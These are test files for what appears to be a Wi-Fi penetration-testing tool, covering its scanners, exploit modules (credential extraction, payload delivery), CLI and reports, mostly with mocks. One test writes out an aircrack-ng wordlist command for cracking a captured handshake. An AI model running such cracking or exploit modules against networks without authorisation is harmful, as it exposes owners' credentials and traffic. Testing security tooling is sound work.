        }
    }

    config_dir = tmp_path / "config"
    config_dir.mkdir(parents=True, exist_ok=True)
    config_file = config_dir / "config.yaml"

    with open(config_file, 'w') as f:
        yaml.dump(config_content, f)

    return config_dir

@pytest.fixture
def mock_vulnerabilities(tmp_path):
    vulnerabilities_dir = tmp_path / "vulnerabilities"
    vulnerabilities_dir.mkdir(parents=True, exist_ok=True)
    vulnerabilities_file = vulnerabilities_dir / "vulnerabilities.json"
    vulnerabilities_content = {
        "Vuln1": ["Issue1", "Issue2"],
        "Vuln2": ["Issue3"]
    }
    with open(vulnerabilities_file, 'w') as f:
        json.dump(vulnerabilities_content, f)
    return vulnerabilities_file

@pytest.fixture
def core_framework(sample_config, mock_vulnerabilities):
    config_dir = sample_config
    modules_path = config_dir / "modules"  # Adjust this path as needed

    # Create dummy modules directory
    modules_path.mkdir(parents=True, exist_ok=True)

    core = CoreFramework(
        modules_path=str(modules_path),
        config_dir=str(config_dir),
        vulnerabilities_path=str(mock_vulnerabilities)
    )
    return core

@pytest.fixture
def runner():
    return CliRunner()

# =========================================
# Tests
# =========================================

def test_config_manager_loads_config(sample_config):
    from core.config_manager import ConfigManager
    config_manager = ConfigManager(config_dir=str(sample_config))
    config = config_manager.get_config()

    assert config.general.interface == 'wlan0mon'
    assert config.general.report_directory == 'reports'
    assert config.general.log_level == 'INFO'
    assert config.scanners.encryption_scanner.scan_duration == 10
    assert config.exploits.session_hijacking.max_packets == 100
    # Update other assertions as needed


def test_network_interface_invalid_interface():
    with pytest.raises(ValueError):
        NetworkInterfaceManager(interface='invalid_interface')

def test_data_storage_manager_initialization(tmp_path):
    report_dir = tmp_path / "reports"
    manager = DataStorageManager(report_directory=str(report_dir))
    assert manager.report_directory == str(report_dir)
    assert os.path.exists(manager.report_directory)

def test_generate_report(tmp_path):
    report_dir = tmp_path / "reports"
    manager = DataStorageManager(report_directory=str(report_dir))
    vulnerability_db = {"Vuln1": ["Issue1", "Issue2"], "Vuln2": ["Issue3"]}
    manager.generate_report(vulnerability_db)
    report_file = os.path.join(manager.report_directory, "report.json")
    assert os.path.exists(report_file)

    # Verify content of the report
    with open(report_file, 'r') as f:
        data = json.load(f)
        assert data == vulnerability_db

def test_authentication_process(mocker):
    auth = AuthenticationTools()
    # Ensure the 'authenticate' method exists
    assert hasattr(auth, 'authenticate')

    # Mock the 'authenticate' method
    mocker.patch.object(auth, 'authenticate', return_value=True)
    result = auth.authenticate()
    assert result == True

def test_auth_bypass_scanner(core_framework):
    scanner = AuthBypassScanner(core_framework=core_framework, scan_duration=15)
    target_info = {'ssid': 'TestSSID', 'bssid': 'AA:BB:CC:DD:EE:FF'}
    vulnerabilities = scanner.scan(target_info)
    assert isinstance(vulnerabilities, dict)
    # Add further assertions as needed

def test_dos_scanner(core_framework):
    scanner = DosScanner(core_framework=core_framework, scan_duration=5)
    target_info = {'ssid': 'TestSSID', 'bssid': 'AA:BB:CC:DD:EE:FF'}
    vulnerabilities = scanner.scan(target_info)
    assert isinstance(vulnerabilities, dict)
    # Add further assertions as needed

def test_local_scanner(core_framework):
    scanner = LocalScanner(
        core_framework=core_framework,
        scan_duration=8,
        interface='wlan0mon',
        vendor_lookup=True
    )
    target_info = {'ssid': 'TestSSID', 'bssid': 'AA:BB:CC:DD:EE:FF'}
    vulnerabilities = scanner.scan(target_info)
    assert isinstance(vulnerabilities, dict)
    # Add further assertions as needed

def test_credential_extraction(core_framework):
    vulnerability = {'Vuln2': ['Issue3']}
    exploit = CredentialExtraction(core_framework=core_framework, vulnerability=vulnerability)
    result = exploit.execute()
    assert isinstance(result, dict)
    # Add further assertions as needed

def test_payload_delivery(core_framework):
    vulnerability = {'Vuln3': ['Issue4']}
    exploit = PayloadDelivery(core_framework=core_framework, vulnerability=vulnerability)
    result = exploit.execute()
    assert isinstance(result, dict)
    # Add further assertions as needed

def test_cli_list_command(runner, sample_config, mock_vulnerabilities, tmp_path, monkeypatch):
    config_dir = sample_config

    # Initialize CoreFramework within the CLI context
    def mock_initialize_coreframework(*args, **kwargs):
        return CoreFramework(
            modules_path=str(config_dir / "modules"),
            config_dir=str(config_dir),
            vulnerabilities_path=str(mock_vulnerabilities)
        )

    # Monkeypatch the 'initialize_coreframework' function in 'cli' module
    monkeypatch.setattr('ui.cli.initialize_coreframework', mock_initialize_coreframework)

    result = runner.invoke(cli, ['list'])

    assert result.exit_code == 0
    assert "Available Scanners:" in result.output
    # Add further assertions based on expected output

def test_cli_report_command(runner, sample_config, mock_vulnerabilities, tmp_path, monkeypatch):
    config_dir = sample_config

    # Initialize CoreFramework within the CLI context
    def mock_initialize_coreframework(*args, **kwargs):
        return CoreFramework(
            modules_path=str(config_dir / "modules"),
            config_dir=str(config_dir),
            vulnerabilities_path=str(mock_vulnerabilities)
        )

    # Monkeypatch the 'initialize_coreframework' function in 'cli' module
    monkeypatch.setattr('ui.cli.initialize_coreframework', mock_initialize_coreframework)

    result = runner.invoke(cli, ['report'])

    assert result.exit_code == 0
    assert "Generating report..." in result.output
    # Verify that the report file exists
    report_dir = config_dir / "reports"
    report_file = report_dir / "report.json"
    assert os.path.exists(report_file)
    # Add further assertions based on expected output


# tests/test_all.py
# tests/test_all.py

import pytest
from unittest.mock import MagicMock, patch, call
from click.testing import CliRunner
import os
import sys
import json
import logging


# ============================
# Fixtures for Mocking
# ============================

@pytest.fixture
def mock_coreframework(mocker):
    """
    Fixture to mock the CoreFramework class used in cli.py.
    Returns the mock instance to allow test functions to configure it as needed.
    """
    # Patch 'core.CoreFramework' to return a mock instance
    mock_coreframework_class = mocker.patch('core.CoreFramework', autospec=True)

    # Create a mock instance of CoreFramework
    mock_coreframework_instance = MagicMock()

    # Assign the mock instance to be returned when CoreFramework() is called
    mock_coreframework_class.return_value = mock_coreframework_instance

    # Initialize vulnerability_db as a real dict
    mock_coreframework_instance.vulnerability_db = {}

    # Initialize scanners and exploits
    mock_coreframework_instance.scanners = {}
    mock_coreframework_instance.exploits = {}

    # Initialize config_manager
    mock_coreframework_instance.config_manager = MagicMock()
    mock_coreframework_instance.config_manager.config_dir = '/path/to/config'
    mock_coreframework_instance.config_manager.get_config.return_value = MagicMock()

    return mock_coreframework_instance


@pytest.fixture
def mock_cli_main(mocker):
    """
    Fixture to mock the cli object from ui.cli for main.py tests.
    """
    return mocker.patch('main.cli')


@pytest.fixture
def mock_sys_exit(mocker):
    """
    Fixture to mock sys.exit to prevent the test runner from exiting.
    """
    return mocker.patch('sys.exit')


# ============================
# Tests for cli.py
# ============================

def test_scan_command_runs_scanner(mocker, mock_coreframework, caplog):
    """
    Test that the 'scan' command successfully runs the specified scanner
    and outputs the expected messages.
    """
    # Configure the mock scanners
    mock_scanner = MagicMock()

    # Mock the run_scanner method to simulate scanner behavior
    def mock_run_scanner(scanner_name, target_info):
        vulnerabilities = {'vuln1': [{'detail': 'Sample vulnerability'}]}
        # Do NOT update vulnerability_db here to prevent duplication
        return vulnerabilities

    mock_coreframework.run_scanner.side_effect = mock_run_scanner

    # Mock 'scanners' dictionary
    mock_coreframework.scanners = {
        'encryption_scanner': mock_scanner
    }

    # Import the CLI after setting up mocks
    from ui.cli import cli

    runner = CliRunner()
    result = runner.invoke(cli, [
        'scan',
        '--target-ssid', 'TestSSID',
        '--target-bssid', 'AA:BB:CC:DD:EE:FF',
        '--scanner', 'encryption_scanner'
    ])

    # Assert exit code
    assert result.exit_code == 0

    # Assert output contains expected messages
    expected_message_1 = "Running scanner: encryption_scanner"
    expected_message_2 = "All specified scans have been executed."

    # Check if the messages are in the output or in the captured logs
    assert expected_message_1 in result.output or expected_message_1 in caplog.text
    assert expected_message_2 in result.output or expected_message_2 in caplog.text

    # Assert that run_scanner was called with correct arguments
    mock_coreframework.run_scanner.assert_called_once_with(
        'encryption_scanner',
        {'ssid': 'TestSSID', 'bssid': 'AA:BB:CC:DD:EE:FF'}
    )

    # Assert that vulnerabilities were added to vulnerability_db
    assert mock_coreframework.vulnerability_db == {
        'vuln1': [{'detail': 'Sample vulnerability'}]
    }


def test_scan_command_without_scanners_shows_available_scanners(mocker, mock_coreframework, caplog):
    """
    Test that the 'scan' command without specifying scanners
    lists available scanners and exits with code 1.
    """
    # Configure the mock scanners
    mock_coreframework.scanners = {
        'encryption_scanner': MagicMock(),
        'auth_bypass_scanner': MagicMock()
    }

    # Import the CLI after setting up mocks
    from ui.cli import cli

    runner = CliRunner()
    result = runner.invoke(cli, [
        'scan',
        '--target-ssid', 'TestSSID',
        '--target-bssid', 'AA:BB:CC:DD:EE:FF'
    ])

    # Assert exit code
    assert result.exit_code == 1

    # Assert output contains expected messages
    expected_output_start = "No scanners specified. Available scanners are:"
    expected_scanner_1 = "- encryption_scanner"
    expected_scanner_2 = "- auth_bypass_scanner"

    assert expected_output_start in result.output or expected_output_start in caplog.text
    assert expected_scanner_1 in result.output or expected_scanner_1 in caplog.text
    assert expected_scanner_2 in result.output or expected_scanner_2 in caplog.text


def test_exploit_command_without_exploits_shows_available_exploits(mocker, mock_coreframework, caplog):
    """
    Test that the 'exploit' command without specifying exploits
    lists available exploits and exits with code 1.
    """
    # Configure the mock exploits
    mock_coreframework.exploits = {
        'session_hijacking': MagicMock(),
        'credential_extraction': MagicMock()
    }

    # Import the CLI after setting up mocks
    from ui.cli import cli

    runner = CliRunner()
    result = runner.invoke(cli, [
        'exploit',
        '--target-ssid', 'TestSSID',
        '--target-bssid', 'AA:BB:CC:DD:EE:FF'
    ])

    # Assert exit code
    assert result.exit_code == 1

    # Assert output contains expected messages
    expected_output_start = "No exploits specified. Available exploits are:"
    expected_exploit_1 = "- session_hijacking"
    expected_exploit_2 = "- credential_extraction"

    assert expected_output_start in result.output or expected_output_start in caplog.text
    assert expected_exploit_1 in result.output or expected_exploit_1 in caplog.text
    assert expected_exploit_2 in result.output or expected_exploit_2 in caplog.text


def test_configure_command_shows_current_configuration(mocker, mock_coreframework, caplog):
    """
    Test that the 'configure' command without settings
    displays the current configuration.
    """
    # Mock the config_manager and its get_config method
    mock_config = MagicMock()
    mock_config.general.interface = 'wlan0mon'
    mock_config.general.report_directory = '/path/to/reports'
    mock_coreframework.config_manager.get_config.return_value = mock_config

    # Mock os.path.exists to simulate that config.yaml exists
    mocker.patch('os.path.exists', return_value=True)

    # Mock the open function to return a sample configuration
    mocker.patch('builtins.open', mocker.mock_open(read_data="general:\n  interface: wlan0mon\n"))

    # Import the CLI after setting up mocks
    from ui.cli import cli

    runner = CliRunner()
    result = runner.invoke(cli, ['configure'])

    # Assert exit code
    assert result.exit_code == 0

    # Assert output contains expected configuration
    expected_output_1 = "Current Configuration:"
    expected_output_2 = "[general]"
    expected_output_3 = "interface: wlan0mon"

    assert expected_output_1 in result.output or expected_output_1 in caplog.text
    assert expected_output_2 in result.output or expected_output_2 in caplog.text
    assert expected_output_3 in result.output or expected_output_3 in caplog.text


def test_report_command_generates_json_report(mocker, mock_coreframework, caplog):
    """
    Test that the 'report' command with '--format json'
    generates a JSON report at the specified location.
    """
    # Configure the mock report_directory
    mock_coreframework.config_manager.config.report_directory = '/path/to/reports'

    # Mock the vulnerability_db
    mock_coreframework.vulnerability_db = {
        'scan1': [{
            'ssid': 'TestSSID',
            'bssid': 'AA:BB:CC:DD:EE:FF',
            'protocol': 'WPA2',
            'description': 'Weak encryption'
        }]
    }

    # Mock os.makedirs to prevent actual directory creation
    mocker.patch('os.makedirs')

    # Mock the open function for writing the JSON report
    mock_open_write = mocker.mock_open()
    mocker.patch('builtins.open', mock_open_write)

    # Import the CLI after setting up mocks
    from ui.cli import cli

    runner = CliRunner()
    result = runner.invoke(cli, ['report', '--format', 'json'])

    # Assert exit code
    assert result.exit_code == 0

    # Construct expected path with os.path.normpath
    expected_path = os.path.normpath('/path/to/reports/json/report.json')

    # Assert output contains expected message
    expected_message = f"JSON report exported to {expected_path}"
    assert expected_message in result.output or expected_message in caplog.text

    # Assert that the report was written correctly
    mock_open_write.assert_called_once_with(expected_path, 'w')
    handle = mock_open_write()
    expected_report = {
        'scans': {
            'scan1': [{
                'ssid': 'TestSSID',
                'bssid': 'AA:BB:CC:DD:EE:FF',
                'protocol': 'WPA2',
                'description': 'Weak encryption'
            }]
        },
        'exploits': {}
    }
    # Concatenate all write calls
    written_data = ''.join(call.args[0] for call in handle.write.call_args_list)
    assert written_data == json.dumps(expected_report, indent=4)


def test_report_command_generates_txt_report(mocker, mock_coreframework, caplog):
    """
    Test that the 'report' command with '--format txt'
    generates a TXT report at the specified location.
    """
    # Configure the mock report_directory
    mock_coreframework.config_manager.config.report_directory = '/path/to/reports'

    # Mock the vulnerability_db
    mock_coreframework.vulnerability_db = {
        'scan1': [{
            'ssid': 'TestSSID',
            'bssid': 'AA:BB:CC:DD:EE:FF',
            'protocol': 'WPA2',
            'description': 'Weak encryption'
        }],
        'exploit1': [{
            'bssid': 'AA:BB:CC:DD:EE:FF',
            'description': 'Credential extraction successful',
            'action': 'Extracted credentials'
        }]
    }

    # Mock os.makedirs to prevent actual directory creation
    mocker.patch('os.makedirs')

    # Mock the open function for writing the TXT report
    mock_open_write = mocker.mock_open()
    mocker.patch('builtins.open', mock_open_write)

    # Import the CLI after setting up mocks
    from ui.cli import cli

    runner = CliRunner()
    result = runner.invoke(cli, ['report', '--format', 'txt'])

    # Assert exit code
    assert result.exit_code == 0

    # Construct expected path with os.path.normpath
    expected_path = os.path.normpath('/path/to/reports/txt/report.txt')

    # Assert output contains expected message
    expected_message = f"TXT report exported to {expected_path}"
    assert expected_message in result.output or expected_message in caplog.text

    # Assert that the report was written correctly
    mock_open_write.assert_called_once_with(expected_path, 'w')
    handle = mock_open_write()

    # Construct expected report with OS-specific line separators
    expected_report = (
        f"Scanner: scan1{os.linesep}"
        f"  - SSID: TestSSID{os.linesep}"
        f"    BSSID: AA:BB:CC:DD:EE:FF{os.linesep}"
        f"    Protocol: WPA2{os.linesep}"
        f"    Description: Weak encryption{os.linesep}"
        f"Exploit: exploit1{os.linesep}"
        f"  - BSSID: AA:BB:CC:DD:EE:FF{os.linesep}"
        f"    Description: Credential extraction successful{os.linesep}"
        f"    Action: Extracted credentials{os.linesep}"
    )

    # Concatenate all write calls
    written_data = ''.join(call.args[0] for call in handle.write.call_args_list)

    # Normalize line endings for comparison
    written_data_normalized = written_data.replace('\r\n', '\n')
    expected_report_normalized = expected_report.replace('\r\n', '\n')

    assert written_data_normalized == expected_report_normalized


def test_list_command_shows_available_scanners_and_exploits(mocker, mock_coreframework, caplog):
    """
    Test that the 'list' command displays all available scanners and exploits.
    """
    # Configure the mock scanners and exploits
    mock_coreframework.scanners = {
        'encryption_scanner': MagicMock(),
        'auth_bypass_scanner': MagicMock()
    }
    mock_coreframework.exploits = {
        'session_hijacking': MagicMock(),
        'credential_extraction': MagicMock()
    }

    # Import the CLI after setting up mocks
    from ui.cli import cli

    runner = CliRunner()
    result = runner.invoke(cli, ['list'])

    # Assert exit code
    assert result.exit_code == 0

    # Assert output contains available scanners
    expected_scanners_header = "\nAvailable Scanners:"
    expected_scanner_1 = "- encryption_scanner"
    expected_scanner_2 = "- auth_bypass_scanner"

    assert expected_scanners_header in result.output or expected_scanners_header in caplog.text
    assert expected_scanner_1 in result.output or expected_scanner_1 in caplog.text
    assert expected_scanner_2 in result.output or expected_scanner_2 in caplog.text

    # Assert output contains available exploits
    expected_exploits_header = "\nAvailable Exploits:"
    expected_exploit_1 = "- session_hijacking"
    expected_exploit_2 = "- credential_extraction"

    assert expected_exploits_header in result.output or expected_exploits_header in caplog.text
    assert expected_exploit_1 in result.output or expected_exploit_1 in caplog.text
    assert expected_exploit_2 in result.output or expected_exploit_2 in caplog.text


# ============================
# Tests for main.py
# ============================

def test_main_successful_invocation(mocker, mock_cli_main, mock_sys_exit, caplog):
    """
    Test that main() successfully invokes the CLI without errors.
    """
    # Arrange
    # Ensure that cli(obj={}) runs without raising an exception
    mock_cli_main.return_value = None  # cli returns nothing (equivalent to sys.exit(0))

    # Act
    from main import main
    main()

    # Assert
    mock_cli_main.assert_called_once_with(obj={})
    mock_sys_exit.assert_not_called()

    # Optionally, check that logging.info was called during setup
    # Since setup_logging sets up a console handler, we can check for initialization logs
    # However, since no log messages are generated in main(), we skip this


def test_main_cli_raises_exception(mocker, mock_cli_main, mock_sys_exit, caplog):
    """
    Test that if cli(obj={}) raises an exception, main() logs the error and exits with code 1.
    """
    # Arrange
    test_exception = Exception("Test CLI Exception")
    mock_cli_main.side_effect = test_exception

    # Act
    from main import main
    main()

    # Assert
    mock_cli_main.assert_called_once_with(obj={})
    mock_sys_exit.assert_called_once_with(1)

    # Check that the error was logged
    assert f"An error occurred while running the CLI: {test_exception}" in caplog.text


def test_main_logging_setup(mocker, caplog):
    """
    Test that the logging is set up correctly in main().
    """
    # Arrange
    with patch('main.cli') as mock_cli_main, \
            patch('sys.exit') as mock_sys_exit:
        # Reset the logger to remove any existing handlers
        logger = logging.getLogger()
        logger.handlers = []
        logger.setLevel(logging.NOTSET)

        # Act
        from main import main
        main()

    # Assert
    # Check that logging has at least one handler
    assert len(logger.handlers) >= 1

    # Check that the root logger level is set to DEBUG
    assert logger.level == logging.DEBUG

    # Check the formatter of the console handler
    console_handler = None
    for handler in logger.handlers:
        if isinstance(handler, logging.StreamHandler):
            console_handler = handler
            break
    assert console_handler is not None, "No StreamHandler found in logger handlers."

    expected_format = '[%(asctime)s] %(levelname)s - %(name)s - %(message)s'
    assert console_handler.formatter._fmt == expected_format


def test_main_logging_error_on_exception(mocker, mock_cli_main, mock_sys_exit, caplog):
    """
    Test that if cli(obj={}) raises an exception, the error is logged correctly.
    """
    # Arrange
    test_exception = ValueError("Invalid value provided")
    mock_cli_main.side_effect = test_exception

    # Act
    from main import main
    main()

    # Assert
    mock_sys_exit.assert_called_once_with(1)
    # Check that the error message is logged
    assert f"An error occurred while running the CLI: {test_exception}" in caplog.text


# ============================
# Entry Point for Running Tests
# ============================

if __name__ == '__main__':
    pytest.main(['-v', 'test_all.py'])


# tests/test_authentication_tools.py
import unittest
from unittest.mock import patch, MagicMock
from project_specific_utils.authentication_tools import AuthenticationTools
import subprocess
import os
import logging


class TestAuthenticationTools(unittest.TestCase):
    def setUp(self):
        # Set up the logger to capture log outputs for assertions
        self.logger = logging.getLogger('AuthenticationTools')
        self.logger.setLevel(logging.DEBUG)
        self.auth_tools = AuthenticationTools()

    @patch('project_specific_utils.authentication_tools.subprocess.run')
    def test_decrypt_handshake_success(self, mock_run):
        # Mock successful decryption with aircrack-ng
        mock_run.return_value = subprocess.CompletedProcess(
            args=['aircrack-ng', '-w', 'wordlist.txt', '-l', 'password.txt', 'handshake.cap'],
            returncode=0,
            stdout='KEY FOUND! [password]',
            stderr=''
        )

        result = self.auth_tools.decrypt_handshake('handshake.cap', 'wordlist.txt', 'password.txt')
        self.assertTrue(result)
        mock_run.assert_called_once_with(['aircrack-ng', '-w', 'wordlist.txt', '-l', 'password.txt', 'handshake.cap'],
                                         check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    @patch('project_specific_utils.authentication_tools.subprocess.run')
    def test_decrypt_handshake_failure_no_key(self, mock_run):
        # Mock decryption attempt with no key found
        mock_run.return_value = subprocess.CompletedProcess(
            args=['aircrack-ng', '-w', 'wordlist.txt', '-l', 'password.txt', 'handshake.cap'],
            returncode=0,
            stdout='No keys found.',
            stderr=''
        )

        result = self.auth_tools.decrypt_handshake('handshake.cap', 'wordlist.txt', 'password.txt')
        self.assertFalse(result)
        mock_run.assert_called_once_with(['aircrack-ng', '-w', 'wordlist.txt', '-l', 'password.txt', 'handshake.cap'],
                                         check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    @patch('project_specific_utils.authentication_tools.subprocess.run')
    def test_decrypt_handshake_command_error(self, mock_run):
        # Mock aircrack-ng command failure
        mock_run.side_effect = subprocess.CalledProcessError(
            returncode=1,
            cmd=['aircrack-ng', '-w', 'wordlist.txt', '-l', 'password.txt', 'handshake.cap'],
            stderr='Aircrack-ng failed to open handshake file.'
        )

        result = self.auth_tools.decrypt_handshake('handshake.cap', 'wordlist.txt', 'password.txt')
        self.assertFalse(result)
        mock_run.assert_called_once_with(['aircrack-ng', '-w', 'wordlist.txt', '-l', 'password.txt', 'handshake.cap'],
                                         check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    # Additional tests for generate_pmkid can be added similarly


if __name__ == '__main__':
    unittest.main()


# tests/test_auth_bypass_scanner.py
import unittest
from unittest.mock import MagicMock, patch
from scanners.auth_bypass_scanner import AuthBypassScanner

class TestAuthBypassScanner(unittest.TestCase):
    def setUp(self):
        self.core_framework = MagicMock()
        self.scanner = AuthBypassScanner(self.core_framework, scan_duration=5)
        self.target = {'bssid': '00:11:22:33:44:55'}

    @patch('scapy.all.sniff')
    @patch('scapy.all.sendp')
    def starts_scan_and_detects_vulnerability(self, mock_sendp, mock_sniff):
        mock_sniff.return_value = []
        self.scanner.scan(self.target)
        self.assertTrue(self.scanner.detected_vulnerabilities)
        self.assertIn('AUTH_BYPASS', self.core_framework.vulnerability_db)

    @patch('scapy.all.sniff')
    @patch('scapy.all.sendp')
    def starts_scan_and_detects_no_vulnerability(self, mock_sendp, mock_sniff):
        mock_sniff.return_value = [MagicMock()]
        self.scanner.scan(self.target)
        self.assertFalse(self.scanner.detected_vulnerabilities)
        self.assertNotIn('AUTH_BYPASS', self.core_framework.vulnerability_db)

    def does_not_start_scan_without_bssid(self):
        self.scanner.scan({})
        self.assertFalse(self.scanner.detected_vulnerabilities)
        self.core_framework.send_continuous_packets.assert_not_called()

    def generates_report_with_vulnerabilities(self):
        self.scanner.detected_vulnerabilities = [{'bssid': '00:11:22:33:44:55', 'description': 'Test', 'action': 'Test action'}]
        with patch('builtins.print') as mock_print:
            self.scanner.report()
            mock_print.assert_called()

    def generates_report_without_vulnerabilities(self):
        self.scanner.detected_vulnerabilities = []
        with patch('builtins.print') as mock_print:
            self.scanner.report()
            mock_print.assert_not_called()

    def finalizes_scan(self):
        self.scanner.finalize()
        self.core_framework.stop_continuous_packets.assert_called()



# tests/test_cli.py
# tests/test_cli.py

import pytest
from click.testing import CliRunner
from unittest.mock import MagicMock
import os
import json


@pytest.fixture
def mock_coreframework(mocker):
    """
    Fixture to mock the CoreFramework class used in cli.py.
    Returns the mock instance to allow test functions to configure it as needed.
    """
    # Step 1: Patch 'core.CoreFramework' to return a mock instance
    mock_coreframework_class = mocker.patch('core.CoreFramework')

    # Step 2: Create a mock instance of CoreFramework
    mock_coreframework_instance = MagicMock()

    # Step 3: Assign the mock instance to be returned when CoreFramework() is called
    mock_coreframework_class.return_value = mock_coreframework_instance

    return mock_coreframework_instance


def test_scan_command_runs_scanner(mocker, mock_coreframework):
    """
    Test that the 'scan' command successfully runs the specified scanner
    and outputs the expected messages.
    """
    # Configure the mock scanners
    mock_scanner = MagicMock()
    mock_scanner.scan.return_value = {'vuln1': [{'detail': 'Sample vulnerability'}]}
    mock_coreframework.scanners = {'encryption_scanner': mock_scanner}

    # Initialize vulnerability_db
    mock_coreframework.vulnerability_db = {}

    # Mock the run_scanner method to simulate scanner behavior
    def mock_run_scanner(scanner_name, target_info):
        vulnerabilities = {'vuln1': [{'detail': 'Sample vulnerability'}]}
        mock_coreframework.vulnerability_db.update(vulnerabilities)
        return vulnerabilities

    mock_coreframework.run_scanner.side_effect = mock_run_scanner

    # Ensure load_protocol_modules is called during initialization
    mock_coreframework.load_protocol_modules = MagicMock()

    # Import the CLI after setting up mocks
    from ui.cli import cli

    runner = CliRunner()
    result = runner.invoke(cli, [
        'scan',
        '--target-ssid', 'TestSSID',
        '--target-bssid', 'AA:BB:CC:DD:EE:FF',
        '--scanner', 'encryption_scanner'
    ])

    # Assert exit code
    assert result.exit_code == 0

    # Assert output contains expected messages
    assert "Running scanner: encryption_scanner" in result.output
    assert "All specified scans have been executed." in result.output

    # Assert that run_scanner was called with correct arguments
    mock_coreframework.run_scanner.assert_called_once_with(
        'encryption_scanner',
        {'ssid': 'TestSSID', 'bssid': 'AA:BB:CC:DD:EE:FF'}
    )

    # Assert that vulnerabilities were added to vulnerability_db
    assert mock_coreframework.vulnerability_db == {
        'vuln1': [{'detail': 'Sample vulnerability'}]
    }


def test_scan_command_without_scanners_shows_available_scanners(mocker, mock_coreframework):
    """
    Test that the 'scan' command without specifying scanners
    lists available scanners and exits with code 1.
    """
    # Configure the mock scanners
    mock_coreframework.scanners = {
        'encryption_scanner': MagicMock(),
        'auth_bypass_scanner': MagicMock()
    }

    # Import the CLI after setting up mocks
    from ui.cli import cli

    runner = CliRunner()
    result = runner.invoke(cli, [
        'scan',
        '--target-ssid', 'TestSSID',
        '--target-bssid', 'AA:BB:CC:DD:EE:FF'
    ])

    # Assert exit code
    assert result.exit_code == 1

    # Assert output contains expected messages
    assert "No scanners specified. Available scanners are:" in result.output
    assert "- encryption_scanner" in result.output
    assert "- auth_bypass_scanner" in result.output


def test_exploit_command_without_exploits_shows_available_exploits(mocker, mock_coreframework):
    """
    Test that the 'exploit' command without specifying exploits
    lists available exploits and exits with code 1.
    """
    # Configure the mock exploits
    mock_coreframework.exploits = {
        'session_hijacking': MagicMock(),
        'credential_extraction': MagicMock()
    }

    # Import the CLI after setting up mocks
    from ui.cli import cli

    runner = CliRunner()
    result = runner.invoke(cli, [
        'exploit',
        '--target-ssid', 'TestSSID',
        '--target-bssid', 'AA:BB:CC:DD:EE:FF'
    ])

    # Assert exit code
    assert result.exit_code == 1

    # Assert output contains expected messages
    assert "No exploits specified. Available exploits are:" in result.output
    assert "- session_hijacking" in result.output
    assert "- credential_extraction" in result.output


def test_configure_command_shows_current_configuration(mocker, mock_coreframework):
    """
    Test that the 'configure' command without settings
    displays the current configuration.
    """
    # Mock the config_manager and its get_config method
    mock_config = MagicMock()
    mock_config.general.interface = 'wlan0mon'
    mock_config.general.report_directory = '/path/to/reports'
    mock_coreframework.config_manager.config_dir = '/path/to/config'
    mock_coreframework.config_manager.get_config.return_value = mock_config

    # Mock os.path.exists to simulate that config.yaml exists
    mocker.patch('os.path.exists', return_value=True)

    # Mock the open function to return a sample configuration
    mocker.patch('builtins.open', mocker.mock_open(read_data="general:\n  interface: wlan0mon\n"))

    # Import the CLI after setting up mocks
    from ui.cli import cli

    runner = CliRunner()
    result = runner.invoke(cli, ['configure'])

    # Assert exit code
    assert result.exit_code == 0

    # Assert output contains expected configuration
    assert "Current Configuration:" in result.output
    assert "[general]" in result.output
    assert "interface: wlan0mon" in result.output


def test_report_command_generates_json_report(mocker, mock_coreframework):
    """
    Test that the 'report' command with '--format json'
    generates a JSON report at the specified location.
    """
    # Configure the mock report_directory
    mock_coreframework.config_manager.config.report_directory = '/path/to/reports'

    # Mock the vulnerability_db
    mock_coreframework.vulnerability_db = {
        'scan1': [{
            'ssid': 'TestSSID',
            'bssid': 'AA:BB:CC:DD:EE:FF',
            'protocol': 'WPA2',
            'description': 'Weak encryption'
        }]
    }

    # Mock os.makedirs to prevent actual directory creation
    mocker.patch('os.makedirs')

    # Mock the open function for writing the JSON report
    mock_open_write = mocker.mock_open()
    mocker.patch('builtins.open', mock_open_write)

    # Import the CLI after setting up mocks
    from ui.cli import cli

    runner = CliRunner()
    result = runner.invoke(cli, ['report', '--format', 'json'])

    # Assert exit code
    assert result.exit_code == 0

    # Construct expected path with os.path.normpath
    expected_path = os.path.normpath('/path/to/reports/json/report.json')

    # Assert output contains expected message
    expected_message = f"JSON report exported to {expected_path}"
    assert expected_message in result.output

    # Assert that the report was written correctly
    mock_open_write.assert_called_once_with(expected_path, 'w')
    handle = mock_open_write()
    expected_report = {
        'scans': {
            'scan1': [{
                'ssid': 'TestSSID',
                'bssid': 'AA:BB:CC:DD:EE:FF',
                'protocol': 'WPA2',
                'description': 'Weak encryption'
            }]
        },
        'exploits': {}
    }
    handle.write.assert_called_once_with(json.dumps(expected_report, indent=4))


def test_report_command_generates_txt_report(mocker, mock_coreframework):
    """
    Test that the 'report' command with '--format txt'
    generates a TXT report at the specified location.
    """
    # Configure the mock report_directory
    mock_coreframework.config_manager.config.report_directory = '/path/to/reports'

    # Mock the vulnerability_db
    mock_coreframework.vulnerability_db = {
        'scan1': [{
            'ssid': 'TestSSID',
            'bssid': 'AA:BB:CC:DD:EE:FF',
            'protocol': 'WPA2',
            'description': 'Weak encryption'
        }],
        'exploit1': [{
            'bssid': 'AA:BB:CC:DD:EE:FF',
            'description': 'Credential extraction successful',
            'action': 'Extracted credentials'
        }]
    }

    # Mock os.makedirs to prevent actual directory creation
    mocker.patch('os.makedirs')

    # Mock the open function for writing the TXT report
    mock_open_write = mocker.mock_open()
    mocker.patch('builtins.open', mock_open_write)

    # Import the CLI after setting up mocks
    from ui.cli import cli

    runner = CliRunner()
    result = runner.invoke(cli, ['report', '--format', 'txt'])

    # Assert exit code
    assert result.exit_code == 0

    # Construct expected path with os.path.normpath
    expected_path = os.path.normpath('/path/to/reports/txt/report.txt')

    # Assert output contains expected message
    expected_message = f"TXT report exported to {expected_path}"
    assert expected_message in result.output

    # Assert that the report was written correctly
    mock_open_write.assert_called_once_with(expected_path, 'w')
    handle = mock_open_write()

    # Construct expected report with OS-specific line separators
    expected_report = (
        f"Scanner: scan1{os.linesep}"
        f"  - SSID: TestSSID{os.linesep}"
        f"    BSSID: AA:BB:CC:DD:EE:FF{os.linesep}"
        f"    Protocol: WPA2{os.linesep}"
        f"    Description: Weak encryption{os.linesep}"
        f"Exploit: exploit1{os.linesep}"
        f"  - BSSID: AA:BB:CC:DD:EE:FF{os.linesep}"
        f"    Description: Credential extraction successful{os.linesep}"
        f"    Action: Extracted credentials{os.linesep}"
    )

    handle.write.assert_called_once_with(expected_report)


def test_list_command_shows_available_scanners_and_exploits(mocker, mock_coreframework):
